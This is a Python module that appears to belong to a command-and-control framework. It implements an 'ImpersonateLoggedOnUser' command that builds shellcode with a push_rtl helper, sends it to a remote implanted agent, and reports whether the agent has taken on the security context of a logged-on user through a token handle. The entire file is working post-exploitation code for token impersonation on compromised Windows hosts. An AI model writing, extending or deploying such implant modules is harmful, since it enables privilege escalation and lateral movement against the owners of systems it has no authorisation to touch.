NAME = "ImpersonateLoggedOnUser"
DESCRIPTION = "Impersonates the security context of a logged-on user using a token handle."
PARAMS = [
    {"name": "hToken", "description":"Handle to an access token representing a logged-on user.", "type":"hex"}
]
DEPENDENCIES = []
DEFAULT = True

def impersonateloggedonuser(agent_id, h_token):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import push_rtl
    
    agent = Agent.by_id(agent_id)
    
    # Resolve advapi32!ImpersonateLoggedOnUser address
    # Ensure advapi32.dll is loaded by the agent before this call
    func_addr = Syscall.sys(agent.id, "ImpersonateLoggedOnUser")
    
    # ImpersonateLoggedOnUser(HANDLE hToken)
    # x64 Calling Convention: hToken is passed in RCX
    params = [
        h_token
    ]

    # Generate the library call shellcode using the RTL helper
    shellcode = push_rtl(func_addr, params, agent.debug)
    
    return shellcode

def impersonateloggedonuser_internal(agent_id, h_token):
    from services.orders import send_and_wait

    # Generate the shellcode for the specific token handle
    shellcode = impersonateloggedonuser(agent_id, h_token)
    
    # Execute and retrieve the BOOL return value (nonzero = success)
    response = send_and_wait(agent_id, shellcode)
    ret_val = int.from_bytes(response, 'little')
    if ret_val != 0:
        return {"retval": 0}
    else:
        return {"retval":-1}

def function(agent_id, args):
    # 'args' should contain the 'hToken' integer value
    h_token = args[0]
        
    result = impersonateloggedonuser_internal(agent_id, h_token)
    return result